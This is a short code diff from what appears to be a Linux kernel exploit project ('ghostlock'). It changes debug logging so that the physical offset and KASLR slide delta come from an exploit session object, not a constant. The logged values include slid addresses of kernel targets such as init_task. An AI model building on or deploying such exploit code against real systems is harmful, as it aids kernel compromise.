@@ -138,10 +138,10 @@ namespace ghostlock::support {
         pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
                    "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
                    "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
-                   getpid(), (unsigned long long) kernel::P0_PHYS_OFFSET,
+                   getpid(), (unsigned long long) session::g_exploit_session.addresses.phys_offset,
                    (unsigned long long) session::g_exploit_session.addresses.phys_load(),
                    (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
-                                         kernel::P0_PHYS_OFFSET),
+                                         session::g_exploit_session.addresses.phys_offset),
                    (unsigned long long) ghostlock::profile::slide_nfulnl_logger(),
                    (unsigned long long) ghostlock::profile::slide_random_boot_id_data(),
                    (unsigned long long) ghostlock::profile::slide_init_task(),
@@ -177,7 +177,7 @@ namespace ghostlock::support {
         pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
                 (unsigned long long) session::g_exploit_session.addresses.phys_load(),
                 (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
-                                      kernel::P0_PHYS_OFFSET));
+                                      session::g_exploit_session.addresses.phys_offset));
     }
 
     void put64(unsigned char *p, size_t off, uint64_t value) {
